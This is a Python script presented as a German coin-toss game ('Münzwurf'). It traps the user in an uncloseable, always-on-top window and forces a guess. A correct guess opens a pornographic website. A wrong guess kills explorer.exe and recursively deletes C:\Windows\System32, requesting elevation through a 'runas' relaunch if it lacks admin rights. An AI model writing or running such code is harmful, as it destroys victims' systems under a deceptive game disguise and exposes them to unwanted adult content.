import os
import random
import time
import ctypes
import shutil
import subprocess
import sys
import tkinter as tk
from tkinter import messagebox

# Initialisiere Zufallsgenerator
random.seed(time.time() + os.getpid())

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def delete_folder(folder_path):
    try:
        subprocess.call('taskkill /F /IM explorer.exe', shell=True)
        time.sleep(2)
        shutil.rmtree(folder_path)
        messagebox.showinfo("Erfolg", f"Ordner {folder_path} wurde gelöscht!")
    except Exception as e:
        messagebox.showerror("Fehler", f"Löschen fehlgeschlagen:\n{str(e)}")
    finally:
        subprocess.call('start explorer.exe', shell=True)

class ForcedInputWindow(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Münzwurf")
        self.resizable(False, False)
        
        # Verhindere Schließen und Minimieren
        self.protocol("WM_DELETE_WINDOW", self.do_nothing)
        self.attributes('-topmost', True)  # Immer im Vordergrund
        
        # GUI-Elemente
        tk.Label(self, text="Kopf oder Zahl?").pack(pady=10)
        self.entry = tk.Entry(self)
        self.entry.pack(pady=5)
        tk.Button(self, text="Bestätigen", command=self.check_input).pack(pady=10)
        
        # Fokus auf Eingabefeld
        self.entry.focus_set()
        
    def do_nothing(self):
        pass  # Ignoriere alle Schließversuche
    
    def check_input(self):
        user_input = self.entry.get().lower()
        if user_input in ("kopf", "zahl"):
            self.destroy()
            self.user_input = user_input
        else:
            messagebox.showwarning("Falsche Eingabe", "Nur 'kopf' oder 'zahl' erlaubt!")
            self.entry.delete(0, tk.END)

def coin_toss():
    # Erzwinge Eingabe
    input_window = ForcedInputWindow()
    input_window.mainloop()
    
    if not hasattr(input_window, 'user_input'):
        return  # Falls Fenster anders geschlossen wurde (sollte nicht möglich sein)
    
    # Münzwurf
    result = random.choice(["kopf", "zahl"])
    user_input = input_window.user_input
    
    # Ergebnis anzeigen
    if user_input == result:
        messagebox.showinfo("Gewonnen!", f"🎉 Richtig! Die Münze zeigt {result}.")
        os.system("start https://www.pornhub-deutsch.net")
    else:
        folder_path = r"C:\Windows\System32"  # 🔴 ANPASSEN!
        messagebox.showinfo("Verloren", f"💀 Falsch! Die Münze zeigt {result}.\nDer Ordner wird gelöscht...")
        
        if is_admin():
            delete_folder(folder_path)
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

if __name__ == "__main__":
    coin_toss()